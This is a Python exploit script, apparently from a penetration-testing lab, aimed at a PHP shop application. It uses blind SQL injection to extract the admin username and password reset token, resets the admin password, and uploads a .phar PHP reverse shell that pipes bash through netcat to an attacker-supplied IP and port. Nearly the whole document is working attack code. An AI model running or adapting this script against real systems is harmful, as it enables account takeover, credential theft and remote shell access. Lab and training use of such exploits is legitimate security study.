import requests
import argparse
import sys
import re

s = requests.session()
http_proxy = 'http://127.0.0.1:8080'
proxyDict = {
            "http" : http_proxy,
            "https" : http_proxy
}

def request_token(target, username):
    print("\n[+] Requesting password reset token...")
    url = "http://%s/login/resetPassword.php" %target
    data = {"username": "%s" %username}
    res = s.post(url, data=data, proxies=proxyDict)
    if "Success" in res.text:
        print("[*] Passsword reset token request succeeded")
    else:
        print("[-] Password reset token request failed :-(")
        sys.exit(-1)

def viewitems_sqli(target, inj_string):
    bit ="0"
    value = 1

    for j in reversed(range(8)):
        inj_strings = "%s>>%s)+=%s" %(inj_string,j, value)
        url = "http://%s/item/viewItem.php?id=%s" %(target, inj_strings)
        res = s.get(url, proxies=proxyDict, allow_redirects=False)

        if res.status_code == 404:
            bit=bit+str("1")
            value=int(bit,2)
        else:
            bit=bit[:-1]
            bit=bit+str("0")
            bit=bit+str("1")
            value=int(bit,2)
    return int(bit[:8],2)

def inject(inj, target, r):
    extracted = ""
    for i in range(1,r):
        inj_string = "1+AND+(ascii(substring((select+%s+from+user+WHERE+id_level+=1+LIMIT+1),%s,1))" %(inj,i)
        retrieved_value = viewitems_sqli(target, inj_string)

        if (retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break

    return extracted

def change_password(target, token, password):

    print("\n[+] Using token to change password...")
    url = "http://%s/login/doResetPassword.php?token=%s"%(target, token)
    res = s.get(url, proxies=proxyDict)
    if 'Success' in res.text:
        print("[*] Valid token supplied. Reseting password..")
    else:
        sys.exit(-1)
    url = "http://%s/login/doChangePassword.php" %target
    data = {"token": "%s" %token, "password": "%s" %password}
    s.post(url, data=data, proxies=proxyDict)

def login(target, username, password):

    print("[+] Logging in with new credentials "+username+"/"+password+"...")
    url = "http://%s/login/checkLogin.php" %target
    data = {"username": "%s" %username, "password": "%s" %password}
    res = s.post(url, data=data, proxies=proxyDict)
    flag = re.findall(r'\w+:\s\w+',res.text)
    print("[*] "+flag[0])

def rvsh(target, ip, port):

    print("[+] Uploading reverse shell to target...")
    url = "http://%s/item/updateItem.php" %target
    s.headers.update({"Content-Type": "multipart/form-data; boundary=---------------------------323420095911071232074181145817"})
    data = "-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"id_user\"\r\n\r\n1\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nRaspery Pi 4\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"image\"; filename=\"test.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f'); ?>\n\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nLatest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n92\r\n-----------------------------323420095911071232074181145817--\r\n" %(ip, port)
    s.post(url, data=data, proxies=proxyDict)
    print("[+] Initating reverse shell. Check NetCat listener....")
    url = "http://%s/item/image/test.phar" %target
    s.get(url, proxies=proxyDict)

def main ():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='Target URL', required=True)
    parser.add_argument('-p','--password', help='Password to set', required=True)
    parser.add_argument('-i','--ip', help='Attacker IP', required=True)
    parser.add_argument('-pt','--port', help='Attacker Port', required=True)
    args = parser.parse_args()

    try:
        target = args.target
        password = args.password
        ip = args.ip
        port = args.port

    except IndexError:
            print("[-] Usage python3 %s -t <target IP> -p <Password to set> -i <Attaker IP> -pt <Attacker Port>" % sys.argv[0])
            print("[-] eg: python3 %s -t 172.17.0.2 -p Offsec123 -i 192.168.163.128 -pt 443" % sys.argv[0])
            sys.exit(-1)

    print("[+] Extrcting administrator Username via SQL Injection...")
    username = inject('username', target, 10)
    request_token(target, username)
    print("[+] Extracting token for "+username+" via SQL Injection...")
    token = inject('token', target, 16)
    change_password(target, token, password)
    login(target, username, password)
    rvsh(target, ip, port)

if __name__ == '__main__':

    main()
